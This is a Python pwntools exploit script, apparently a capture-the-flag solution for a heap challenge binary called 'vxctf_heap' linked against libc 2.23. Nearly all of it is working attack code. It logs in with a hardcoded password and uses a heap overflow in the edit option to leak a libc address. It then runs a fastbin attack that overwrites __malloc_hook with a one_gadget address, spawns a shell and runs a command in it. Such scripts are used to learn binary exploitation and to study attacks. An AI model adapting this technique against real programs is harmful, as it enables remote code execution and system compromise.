from pwn import *

#0x45216 execve("/bin/sh", rsp+0x30, environ)
#0x4526a execve("/bin/sh", rsp+0x30, environ)
#0xf02a4 execve("/bin/sh", rsp+0x50, environ)
#0xf1147 execve("/bin/sh", rsp+0x70, environ)

r=process("./vxctf_heap")
libc=ELF("libc-2.23.so")
one=0xf1147 
pause()

r.recvuntil(":)\n")
password="3.x1P>p_71"
r.sendline(password)
log.info("logged in the system")



def add(size,content):
    r.sendline("1")
    r.recvuntil(">>")
    r.sendline(str(size))
    r.recvuntil(">>")
    r.sendline(content)
    r.recvuntil(">>")

def remove(id):
    r.sendline("2")
    r.recvuntil(">>")
    r.sendline(str(id))
    r.recvuntil(">>")
 

def edit(id,content):
    r.sendline("3")
    r.recvuntil(">>")
    r.sendline(str(id))
    r.recvuntil(">>")
    r.sendline(str(len(content)))
    r.recvuntil(">>")
    r.sendline(content)
    r.recvuntil(">>")
   
r.recvuntil(">>")

add(0x90,"A"*8) #0
add(0x90,"B"*8) #1
add(0x90,"C"*8) #2
add(0x20,"D"*8) #3
remove(1)

edit(0,"Q"*(0x90+8)+"X"*8)
sleep(1)

log.info("leaking libc")
r.sendline("4")
r.recvuntil(">>")
r.sendline("0")
r.recvuntil("XXXXXXXX")
leak=r.recvuntil("\n")
leak=u64(leak[:-1].ljust(8,"\x00"))
print "leaked address : "+hex(leak)
calculated_malloc=leak+0x00007f31a1b4e130-0x7f31a1e8eb78
libc_base=calculated_malloc-libc.symbols['malloc']
print "leaked libc ="+ hex(libc_base)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
print "malloc_hook = "+hex(malloc_hook)
rce=libc_base+one
print "one = "+hex(rce)

log.info("cleaning")
edit(0,"Q"*(0x90)+p64(0)+p64(0xa1)+p64(leak)+p64(leak))

for i in range (0,4):
    remove(i)

log.info("fastbin attack")
add(0x60,"A"*8) #0
add(0x60,"B"*8) #1
add(0x60,"C"*8) #2
add(0x100,"D"*8) #3

remove(2)
remove(0)
edit(1,"Q"*(0x60)+p64(0)+p64(0x71)+p64(malloc_hook-35))
add(0x60,"F"*8)
add(0x60,"G"*8)
add(0x60,"A"*8+"B"*8+"C"*3+p64(rce))
r.sendline("1")

r.sendline("1000")
r.sendline("ls -al")
r.interactive()